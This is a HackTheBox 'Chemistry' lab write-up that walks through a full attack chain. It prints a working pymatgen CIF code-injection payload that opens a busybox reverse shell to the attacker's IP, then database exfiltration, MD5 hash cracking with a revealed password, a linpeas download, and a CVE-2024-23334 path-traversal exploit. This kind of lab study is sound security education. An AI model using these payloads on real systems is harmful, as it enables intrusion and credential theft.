---
title: "HTB - Chemistry (Easy | Linux | Web)"
date: 2025-02-17 00:00:00 +0000
categories: [HackTheBox, Web]
tags: [htb, cif, pymatgen, rce, sqlite, hash-cracking, aiohttp, cve-2024-23334, path-traversal, port-forwarding]
image:
  path: https://i.pinimg.com/originals/0a/f5/9f/0af59f26773f98c2c29352c11f9d09b6.gif
---

## Overview

**Chemistry** is an Easy-rated HackTheBox Linux machine exploiting a Remote Code Execution vulnerability in the `pymatgen` CIF file parser, leading to credential extraction from a SQLite database and privilege escalation via a path traversal vulnerability in an internal `aiohttp` service (CVE-2024-23334).

| Field | Details |
|---|---|
| OS | Linux (Ubuntu) |
| Difficulty | Easy |
| IP | 10.10.11.38 |
| Service | Chemistry CIF Analyzer (port 5000) |

---

## Reconnaissance

### Nmap

```bash
nmap -sVC -p- --min-rate 5000 -n -vvv 10.10.11.38
```

```
22/tcp   open  ssh   OpenSSH 8.2p1 Ubuntu
5000/tcp open  http  Werkzeug/3.0.3 Python/3.9.5
```

Port 5000 exposes a **Chemistry CIF Analyzer** web application built on Python/Werkzeug.

---

## Exploitation — RCE via Malicious CIF File (pymatgen)

The application parses `.cif` (Crystallographic Information File) files. The `pymatgen` library used for parsing is vulnerable to code injection via the `_space_group_magn.transform_BNS_Pp_abc` field, which is evaluated as a Python expression.

### Initial Payload (nc — no interactive shell)

```
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("nc 10.10.16.9 1337");0,0,0'
_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Connection received but non-interactive. Switch to `busybox` for a proper shell:

### Final Payload (busybox — interactive shell)

```
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("busybox nc 10.10.16.9 1337 -e /bin/bash");0,0,0'
```

```bash
nc -lvnp 1337
```

```
whoami
app
```

### TTY Upgrade

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```

---

## Credential Extraction — SQLite Database

### Exfiltrating the Database

```bash
app@chemistry:~/instance$ python3 -m http.server 9999
```

```bash
wget http://10.10.11.38:9999/database.db
```

### Dumping Password Hashes

```bash
sqlite3 database.db
.tables
SELECT * FROM user;
```

```
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
...
```

### Cracking rosa's Hash

```bash
echo "63ed86ee9f624c7b14f1d4f43dc251a5" > hash.txt
```

Cracked via [crackstation.net](https://crackstation.net) or hashcat:

```
63ed86ee9f624c7b14f1d4f43dc251a5 → unicorniosrosados
```

---

## Foothold — SSH as rosa

```bash
ssh rosa@10.10.11.38
cat user.txt
```

**User flag captured.**

---

## Privilege Escalation — CVE-2024-23334 (aiohttp Path Traversal)

### Enumeration

`sudo -l` reveals no sudo rights. Check internal services:

```bash
netstat -tuln
```

```
127.0.0.1:8080   LISTEN
```

An internal web service is running on port 8080. Confirmed via linpeas:

```bash
wget http://10.10.16.9/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Port 8080 is a **status dashboard** running `aiohttp`, which is vulnerable to **CVE-2024-23334** — a path traversal in static file serving that allows reading arbitrary files as the service owner (root).

### Port Forwarding

Tunnel port 8080 to our local machine:

```bash
ssh -L 8080:127.0.0.1:8080 rosa@10.10.11.38
```

### Exploiting CVE-2024-23334

```bash
git clone https://github.com/wizarddos/CVE-2024-23334.git
python3 exploit.py -u http://127.0.0.1:8080/ -f /root/root.txt -d assets
```

```
[+] Attempt 2
Payload: assets/../../../root/root.txt
Status code: 200
b94f371b36025397097a70bdc60d9cca
```

**Root flag captured.**

---

## Attack Chain Summary

```
pymatgen CIF parser → Python code injection
  └─► busybox reverse shell → app user
        └─► database.db exfiltration → MD5 hashes
              └─► Hash crack → rosa:unicorniosrosados
                    └─► SSH → User Flag
                          └─► netstat → port 8080 (aiohttp internal service)
                                └─► SSH port forwarding → local access
                                      └─► CVE-2024-23334 path traversal
                                            └─► /root/root.txt → Root Flag
```

---

## Key Takeaways

- **CIF file parsers** that evaluate expressions are a severe attack surface — always validate and sandbox user-supplied structured file formats.
- **SQLite databases** in web application directories are frequently overlooked during hardening and can contain plaintext or weakly hashed credentials.
- **Internal services** on loopback interfaces are not inherently safe — always enumerate with `netstat` or `ss` after gaining a foothold.
- **CVE-2024-23334** affects `aiohttp < 3.9.2` when serving static files with `follow_symlinks=True` — path traversal allows reading arbitrary files with the service's privileges.
